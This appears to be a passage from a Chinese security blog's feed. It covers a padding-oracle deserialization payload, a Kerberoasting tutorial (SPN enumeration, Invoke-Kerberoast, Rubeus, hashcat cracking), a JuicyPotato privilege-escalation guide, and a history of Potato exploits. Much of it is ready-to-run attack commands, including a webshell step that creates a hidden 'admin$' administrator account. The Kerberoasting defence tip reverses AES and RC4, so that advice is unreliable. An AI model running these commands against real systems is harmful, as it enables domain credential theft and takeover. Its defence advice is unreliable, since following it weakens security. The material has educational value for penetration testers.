X8E4mP300AMIGgimdqHhecoyzK64eNcoovKC5xa+G67RC4OA6mrky14UY5bYLHJhjc5lndRe5iU&#x2F;cRt4NyDa0QguUKKNC3eBIYqSIVrx5uFLrBs9dzFhG46oMhcIXh80IwXcR8PYSUrm1V2dCydUBdOHLEahzysAi4ED&#x2F;zxv8HQyvQYaSCdkJdKP5Kh8yagxYNvl6GBCO0FyLxn&#x2F;dzeVuCfyPh6fIJi9uEIdJ5e72UTKAph+ot5DpcolN2l0DibOE7NCm74YpBrw43RlTNJrtBLh2ngsphanUPpC42K3TZgrXieiMnotTi3VODQmgIa+fF0+ZVxKBOl7VwMlZzJgkmxY2e5Ql28Q2VVt+Wk+jEad&#x2F;zok70ZjDUUCiopEJlYIlkG22C1zbEbia8IUMtRTsJZnF612x4YvlfX9RFo6bnWXpS&#x2F;bKFwbaJPiFr6bSTfSy1LInH9u1vscfSMEB8YZ+w6aq73kH3szftfbm&#x2F;MskuWgqfU28ZLPAbml4IhH3n7c payload.class</span><br></pre></td></tr></table></figure><p>经过了爆破</p><p>得到padding oracle attack后的cookie</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNzAzMzEucG5n?x-oss-process=image/format,png" alt="image-20200527170142533"></p><p>复制该cookie，重放即可成功执行命令</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNzAzMTYucG5n?x-oss-process=image/format,png" alt="image-20200527170316763"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.oniont.cn/index.php/archives/298.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/298.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:Kerberoasting攻击和SPN服务</title>
      <link href="/2020/05/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberoasting%E6%94%BB%E5%87%BB%E5%92%8CSPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2020/05/27/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberoasting%E6%94%BB%E5%87%BB%E5%92%8CSPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-SPN"><a href="#0x01-SPN" class="headerlink" title="0x01 SPN"></a>0x01 SPN</h1><p>SPN（ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。</p><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p><p>Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN</p><p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDM2MzIucG5n?x-oss-process=image/format,png" alt="image-20200518143632006"></p><h1 id="0x02-SPN发现"><a href="#0x02-SPN发现" class="headerlink" title="0x02 SPN发现"></a>0x02 SPN发现</h1><p>由于每台服务器都需要注册用于Kerberos身份验证服务的SPN</p><p>所以这是一个更加隐蔽的方法来收集有关内网域环境的信息</p><h2 id="查询SPN服务，内网探测"><a href="#查询SPN服务，内网探测" class="headerlink" title="查询SPN服务，内网探测"></a>查询SPN服务，内网探测</h2><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测</p><h3 id="使用SetSPN"><a href="#使用SetSPN" class="headerlink" title="使用SetSPN"></a>使用SetSPN</h3><p>Win7和Windows Server2008自带的工具</p><p>查看当前域内的所有SPN：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q *&#x2F;*</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxNDMyMjcucG5n?x-oss-process=image/format,png" alt="image-20200518143227803"></p><p>查看test域内的所有SPN：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q *&#x2F;*</span><br></pre></td></tr></table></figure><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-yd2XpX1l-1590547189992)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200518143251.png\)\]</a></p><p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN</p><p>有三个：</p><p>域控制器：</p><p>CN=DC,OU=Domain Controllers,DC=sun,DC=com</p><p>域用户帐户：</p><p>CN=krbtgt,CN=Users,DC=sun,DC=com</p><p>机器帐户：</p><p>CN=WIN7,CN=Computers,DC=sun,DC=com</p><p>其他命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看当前域内所有的SPN：setspn  -Q  *&#x2F;*</span><br><span class="line">查看指定域xie.com注册的SPN：setspn -T sun.com -Q *&#x2F;*      如果指定域不存在，则默认切换到查找本域的SPN</span><br><span class="line">查找本域内重复的SPN：setspn -X</span><br><span class="line">删除指定SPN：setspn -D MySQL&#x2F;win7.xie.com:1433&#x2F;MSSQL hack</span><br><span class="line">查找指定用户&#x2F;主机名注册的SPN：setspn -L username&#x2F;hostname</span><br></pre></td></tr></table></figure><h3 id="使用PowerShell脚本"><a href="#使用PowerShell脚本" class="headerlink" title="使用PowerShell脚本"></a>使用PowerShell脚本</h3><ul><li>PowerShell-AD-Recon</li></ul><p>该工具包提供了一些探测指定SPN的脚本，例如Exchange，Microsoft SQLServer等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#扫描域中所有的SPN信息</span><br><span class="line">Import-Module .\Discover-PSInterestingServices.ps1;Discover-PSInterestingServices</span><br></pre></td></tr></table></figure><ul><li>GetUserSPNs.ps1</li></ul><p>Kerberoast 工具集中的一个 powershell 脚本，用来查询域内用户注册的 SPN</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure><ul><li>PowerView.ps1</li></ul><p>PowerView是 PowerSpolit 中 Recon目录下的一个powershell脚本，返回的信息比较详细。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></table></figure><h1 id="0x03-Kerberoasting攻击"><a href="#0x03-Kerberoasting攻击" class="headerlink" title="0x03 Kerberoasting攻击"></a>0x03 Kerberoasting攻击</h1><h2 id="0x031基于Kerberos认证的原理："><a href="#0x031基于Kerberos认证的原理：" class="headerlink" title="0x031基于Kerberos认证的原理："></a>0x031基于Kerberos认证的原理：</h2><p>基于Kerberos认证，具体认证过程可以参考我之前的文章</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-q5UTmw4K-1590547189994)(<a href="https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]" target="_blank" rel="noopener">https://gitee.com/godzeo/blogimg/raw/master/img/20200527100825.png\)\]</a></p><p>1、用户将AS-REQ数据包发送给KDC（Key Distribution Centre，密钥分发中心，此处为域控），进行身份认证。</p><p>2、KDC验证用户的凭据，如果凭据有效，则返回TGT（Ticket-Granting Ticket，票据授予票据）。</p><p>3、如果用户想通过身份认证，访问某个服务（如IIS），那么他需要发起（Ticket Granting Service，票据授予服务）请求，请求中包含TGT以及所请求服务的SPN（Service Principal Name，服务主体名称）。</p><p>4、如果TGT有效并且没有过期，TGS会创建用于目标服务的一个服务票据。服务票据使用服务账户的凭据进行加密。</p><p>5、用户收到包含加密服务票据的TGS响应数据包。</p><p>6、最后，服务票据会转发给目标服务，然后使用服务账户的凭据进行解密。</p><p>整个过程比较简单，我们需要注意的是，服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从TGS处请求服务票据，然后离线暴力破解。</p><h2 id="0x032利用思路"><a href="#0x032利用思路" class="headerlink" title="0x032利用思路"></a>0x032利用思路</h2><h4 id="域内的任何用户都可以向域内的任何服务请求TGS"><a href="#域内的任何用户都可以向域内的任何服务请求TGS" class="headerlink" title="域内的任何用户都可以向域内的任何服务请求TGS"></a>域内的任何用户都可以向域内的任何服务请求TGS</h4><p>域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p><p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p><p>因此，高效率的利用思路如下：</p><ol><li>查询SPN，找到有价值的SPN，需要满足以下条件：<ul><li>该SPN注册在域用户帐户(Users)下</li><li>域用户账户的权限很高</li></ul></li><li>请求TGS</li><li>导出TGS</li><li>暴力破解</li></ol><h2 id="0x033利用方法"><a href="#0x033利用方法" class="headerlink" title="0x033利用方法"></a>0x033利用方法</h2><h3 id="一、自动实现，并且不需要mimikatz，普通用户权限即可"><a href="#一、自动实现，并且不需要mimikatz，普通用户权限即可" class="headerlink" title="一、自动实现，并且不需要mimikatz，普通用户权限即可"></a>一、自动实现，并且不需要mimikatz，普通用户权限即可</h3><p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p><p>实例演示：</p><p>在域内一台主机上以普通用户权限执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl</span><br></pre></td></tr></table></figure><p>只提取出hash的参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure><p>使用hashcat破解的参数如下：</p><p>将导出的hashcat格式的哈希保存为hash.txt文件，放到hashcat的目录下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h3 id="二、使用-Rubeus"><a href="#二、使用-Rubeus" class="headerlink" title="二、使用 Rubeus"></a>二、使用 Rubeus</h3><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p><p>使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      | |</span><br><span class="line"> _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">|  __  &#x2F;| | | |  _ \| ___ | | | |&#x2F;___)</span><br><span class="line">| |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">|_|   |_|____&#x2F;|____&#x2F;|_____)____&#x2F;(___&#x2F;</span><br><span class="line"></span><br><span class="line">v1.5.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Action: Kerberoasting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : zeo</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;harmj0y,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : asdf&#x2F;asdfasdf</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf&#x2F;asdfasdf*$AE5F019D4CDED6CD74830CC......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] SamAccountName         : sqlservice</span><br><span class="line">[*] DistinguishedName      : CN&#x3D;SQL,CN&#x3D;Users,DC&#x3D;zeolab,DC&#x3D;local</span><br><span class="line">[*] ServicePrincipalName   : MSSQLSvc&#x2F;SQL.zeolab.local</span><br><span class="line">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc&#x2F;SQL.zeolab.local*$E2B3869290......</span><br></pre></td></tr></table></figure><h2 id="0x034离线破解服务票据"><a href="#0x034离线破解服务票据" class="headerlink" title="0x034离线破解服务票据"></a>0x034离线破解服务票据</h2><p>将哈希保存为hash.txt文件，放到hashcat的目录下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h1 id="0x04-Kerberoast攻击防范"><a href="#0x04-Kerberoast攻击防范" class="headerlink" title="0x04 Kerberoast攻击防范"></a>0x04 Kerberoast攻击防范</h1><ul><li>将默认的AES256_HMAC加密方式改为RC4_HMAC_MD5，增加破解难度</li><li>保证服务密码本身为强密码，关键是提高密码的强度。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>烂土豆Juicypotato提权原理和利用</title>
      <link href="/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/"/>
      <url>/2020/05/25/%E7%83%82%E5%9C%9F%E8%B1%86Juicypotato%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86%E5%92%8C%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="0x00-Potato（烂土豆）提权的原理："><a href="#0x00-Potato（烂土豆）提权的原理：" class="headerlink" title="0x00 Potato（烂土豆）提权的原理："></a>0x00 Potato（烂土豆）提权的原理：</h2><p>所谓的烂土豆提权就是俗称的MS16-075</p><p>可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。</p><h3 id="一、简单的原理："><a href="#一、简单的原理：" class="headerlink" title="一、简单的原理："></a>一、简单的原理：</h3><p>攻击者可以诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机！</p><p>Microsoft通过使用已经进行的质询来禁止同协议NTLM身份验证来对此进行修补。这意味着从一个主机回到自身的SMB-&gt; SMB NTLM中继将不再起作用。但是，跨协议攻击（例如HTTP-&gt; SMB）仍然可以正常使用！</p><h3 id="二、我的理解流程："><a href="#二、我的理解流程：" class="headerlink" title="二、我的理解流程："></a>二、我的理解流程：</h3><p>1、所以我们控制HTTP流量大概都流经我们控制的HTTP服务器，做中介人攻击。</p><p>2、可以诱导系统高权用户执行一些操作，例如将它们重定向到需要NTLM身份验证的地方。所有NTLM凭据都将中继到本地SMB侦听器，以创建运行用户定义的命令的新系统服务，例如是Windows Update服务的请求时，就会是一个高权令牌，劫持掉这个令牌</p><p>3、最后模仿这个高权令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌</p><h2 id="0x01-使用方法"><a href="#0x01-使用方法" class="headerlink" title="0x01 使用方法"></a>0x01 使用方法</h2><hr><h3 id="1、查看当前用户权限，是否符合要求"><a href="#1、查看当前用户权限，是否符合要求" class="headerlink" title="1、查看当前用户权限，是否符合要求"></a>1、查看当前用户权限，是否符合要求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all </span><br><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</span><br><span class="line"></span><br><span class="line">如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</span><br></pre></td></tr></table></figure><p>如果均开启，可以选择<code>-t *</code></p><p>如果均未开启，那么无法提权</p><p>例子</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzI1NTIucG5n?x-oss-process=image/format,png" alt="image-20200518132552127"></p><h3 id="2、查看RPC默认端口是否为135"><a href="#2、查看RPC默认端口是否为135" class="headerlink" title="2、查看RPC默认端口是否为135"></a>2、查看RPC默认端口是否为135</h3><p>如果被修改(例如为111)，juicypotato的参数可以使用<code>-n 111</code></p><p>如果系统禁用了RPC，并不是一定无法提权，需要满足如下条件：</p><p>找到另一系统，能够以当前用户的权限进行远程RPC登录，此时juicypotato的参数可以使用<code>-k</code></p><p>例如Win7、WIn8系统，默认配置下，允许135端口的入站规则即可进行远程RPC登录</p><p>添加防火墙规则允许135端口入站的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;135&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;135 action&#x3D;allow</span><br></pre></td></tr></table></figure><h3 id="3、根据操作系统选择可用的CLSID"><a href="#3、根据操作系统选择可用的CLSID" class="headerlink" title="3、根据操作系统选择可用的CLSID"></a>3、根据操作系统选择可用的CLSID</h3><p>参考列表</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>例如测试系统win7 ，选择CLSID为 {555F3418-D99E-4E51-800A-6E89CFD8B1D7}</p><h3 id="4、选择一个系统未占用的端口作为监听端口"><a href="#4、选择一个系统未占用的端口作为监听端口" class="headerlink" title="4、选择一个系统未占用的端口作为监听端口"></a>4、选择一个系统未占用的端口作为监听端口</h3><p>例如，最终参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;8BC3F05E-D86B-11D0-A075-00C04FB68820&#125;</span><br></pre></td></tr></table></figure><p>表示开启SeImpersonate权限创建进程，监听端口1111，使用的CLSID为<code>{8BC3F05E-D86B-11D0-A075-00C04FB68820}</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ5NDYucG5n?x-oss-process=image/format,png" alt="image-20200518134946085"></p><p>之后会弹出CMD命令行</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzU2MTYucG5n?x-oss-process=image/format,png" alt="image-20200518135616269"></p><h2 id="0x02-限制条件"><a href="#0x02-限制条件" class="headerlink" title="0x02 限制条件"></a>0x02 限制条件</h2><hr><p>经过以上的分析，Juicy Potato的限制条件如下：</p><ul><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限</li><li>开启DCOM</li><li>本地支持RPC或者远程服务器支持PRC并能成功登录</li><li>能够找到可用的COM对象</li></ul><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><h2 id="0x03-WEBSHELL版本"><a href="#0x03-WEBSHELL版本" class="headerlink" title="0x03 WEBSHELL版本"></a>0x03 WEBSHELL版本</h2><p>土司找到了大佬改写过的WebShell版烂土豆，上传到服务器后执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p whoami</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTgxMzQ4NDkucG5n?x-oss-process=image/format,png" alt="image-20200518134849944"></p><p>提权成功，但蚁剑的WebShell里好像只能传一个参数？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将password替换为满足强度要求的密码，否则需要改组策略关闭密码强度检查</span><br><span class="line">execute -f JuicyPotato.exe -p net user admin$ password</span><br><span class="line">execute -f JuicyPotato.exe -p net localgroup administrators admin$ &#x2F;add</span><br></pre></td></tr></table></figure><h2 id="0x04-在Cobaltstrike中使用Juicypotato提权"><a href="#0x04-在Cobaltstrike中使用Juicypotato提权" class="headerlink" title="0x04-在Cobaltstrike中使用Juicypotato提权"></a>0x04-在Cobaltstrike中使用Juicypotato提权</h2><p>在Cobaltstrike中使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升</p><p>但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><p>下载并解压reflectiveJuicyPotato.zip，在Cobaltstike中选择脚本管理器–&gt;load加载juicypotato.cna脚本</p><p>随后我们在提权模块即可发现多了一个JuicyPotato</p><h2 id="0x05-烂土豆优点"><a href="#0x05-烂土豆优点" class="headerlink" title="0x05 烂土豆优点"></a>0x05 烂土豆优点</h2><p>​ 1.非常可靠，这种都比较稳定，基本上不肯能蓝屏掉线的。<br>​ 2.不用需要等Windows更新，可以主动触发高权。<br>​ 3.多全版本通杀。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.t00ls.net/viewthread.php\?tid=47362\&amp;highlight=potato" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php\?tid=47362\&amp;highlight=potato</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Windows\%E6\%9C\%AC\%E5\%9C\%B0\%E6\%8F\%90\%E6\%9D\%83\%E5\%B7\%A5\%E5\%85\%B7Juicy-Potato\%E6\%B5\%8B\%E8\%AF\%95\%E5\%88\%86\%E6\%9E\%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows\%E6\%9C\%AC\%E5\%9C\%B0\%E6\%8F\%90\%E6\%9D\%83\%E5\%B7\%A5\%E5\%85\%B7Juicy-Potato\%E6\%B5\%8B\%E8\%AF\%95\%E5\%88\%86\%E6\%9E\%90/</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>土豆提权历史进程</title>
      <link href="/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/"/>
      <url>/2020/05/25/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%86%E5%8F%B2%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h1><p>在研究提权的时候，发现最近这些东西比较多，而且我自己看起来也是比较混乱，就从网上收集了一些资料，做一个整合和搬运，复现和整理一下，方便你我</p><p>现在还是有点迷糊，这个估计会再更新，等我再理的清楚一些，然后后面就是单个的文章发布，这个是总的简介</p><h1 id="0x01-历史进程"><a href="#0x01-历史进程" class="headerlink" title="0x01 历史进程"></a>0x01 历史进程</h1><h2 id="2016-01-16-初代土豆"><a href="#2016-01-16-初代土豆" class="headerlink" title="2016-01-16 初代土豆"></a>2016-01-16 初代土豆</h2><p>劫持wpad配合ntlm中继来进行提权</p><p><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" target="_blank" rel="noopener">Hot Potato – Windows Privilege Escalation</a></p><h2 id="2016-09-26-二代土豆"><a href="#2016-09-26-二代土豆" class="headerlink" title="2016-09-26 二代土豆"></a>2016-09-26 二代土豆</h2><p>劫持系统com服务器地址到恶意服务器上,然后在NTLM Type 3时做AcceptSecurityContext调用去拿system的令牌</p><p><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener">Rotten Potato – Privilege Escalation from Service</a></p><h2 id="2018-01-13-土豆token细节"><a href="#2018-01-13-土豆token细节" class="headerlink" title="2018/01/13 土豆token细节"></a>2018/01/13 土豆token细节</h2><p><a href="https://decoder.cloud/2018/01/13/potato-and-tokens/" target="_blank" rel="noopener">Potatoes and tokens – Decoder’s Blog</a></p><h2 id="2018-08-10-整理了一些可用的CLSID"><a href="#2018-08-10-整理了一些可用的CLSID" class="headerlink" title="2018-08-10 整理了一些可用的CLSID"></a>2018-08-10 整理了一些可用的CLSID</h2><p>​ <a href="https://ohpe.it/juicy-potato/" target="_blank" rel="noopener">Juicy Potato (abusing the golden privileges) | jui…</a></p><h2 id="2018-10-29-微软把土豆利用链修复"><a href="#2018-10-29-微软把土豆利用链修复" class="headerlink" title="2018/10/29 微软把土豆利用链修复"></a>2018/10/29 微软把土豆利用链修复</h2><p>现在ntlm认证时句柄已不可控</p><p><a href="https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/" target="_blank" rel="noopener">No more rotten/juicy potato? – Decoder’s Blog</a></p><h2 id="2019-03-06-提到了利用命名管道模拟客户端问题"><a href="#2019-03-06-提到了利用命名管道模拟客户端问题" class="headerlink" title="2019/03/06 提到了利用命名管道模拟客户端问题"></a>2019/03/06 提到了利用命名管道模拟客户端问题</h2><p><a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener">Windows Named Pipes &amp; Impersonation – Decoder’s Bl</a></p><h2 id="2020-05-02-三代土豆"><a href="#2020-05-02-三代土豆" class="headerlink" title="2020/05/02 三代土豆"></a>2020/05/02 三代土豆</h2><p>​ 目前杀伤力最大的一个利用链，通过命名管道模拟来获取system的令牌<br>​ <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener">PrintSpoofer - Abusing Impersonation Privileges on</a></p><h2 id="2020-05-11"><a href="#2020-05-11" class="headerlink" title="2020/05/11"></a>2020/05/11</h2><p>​ 劫持OXID解析器修改ResolveOxid2响应地址为恶意管道地址<br><a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" target="_blank" rel="noopener">No more JuicyPotato? Old story, welcome RoguePotat</a><br>​</p><h2 id="2020-05-13-土豆提权集合"><a href="#2020-05-13-土豆提权集合" class="headerlink" title="2020/05/13 土豆提权集合"></a>2020/05/13 土豆提权集合</h2><p><a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">GitHub - CCob/SweetPotato: Local Service to SYSTEM…</a></p><h2 id="名字疑惑"><a href="#名字疑惑" class="headerlink" title="名字疑惑"></a>名字疑惑</h2><p>RottenPotato 升级版—》 JuicyPotato</p><p>sweetpotato == Juicy/PrintSpoofer 集合版</p><p>PrintSpoofer == PipePotato== BadPotato 三个名字 ？<br>最初公开POC的老外叫它PrintSpoofer，之后360的paper叫它PipePotato，然后GitHub一个国人的POC又叫它BadPotato。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker:打包正在运行的容器，快速拖环境跑路</title>
